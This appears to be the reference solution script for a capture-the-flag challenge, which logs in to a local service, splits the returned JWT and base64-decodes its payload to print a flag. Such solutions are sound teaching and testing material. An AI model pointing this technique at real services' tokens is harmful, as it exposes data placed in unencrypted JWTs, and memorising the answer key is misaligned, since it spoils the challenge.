#!/usr/bin/env python3
"""Reference exploit for leak6 (formerly leak-jwt).

Log in, take the JWT, split off the payload segment and base64-decode it.
"""
import base64
import json
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8015")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    r = requests.post(BASE + "/login", timeout=5)
    token = r.json().get("token", "")
    parts = token.split(".")
    if len(parts) != 3:
        sys.stderr.write("not a JWT\n")
        return 1
    pad = parts[1] + "=" * (-len(parts[1]) % 4)
    payload = json.loads(base64.urlsafe_b64decode(pad))
    flag = payload.get("flag", "")
    if re.match(r"flag\{[^}]*\}", flag):
        print(flag)
        return 0
    sys.stderr.write("no flag in JWT payload\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
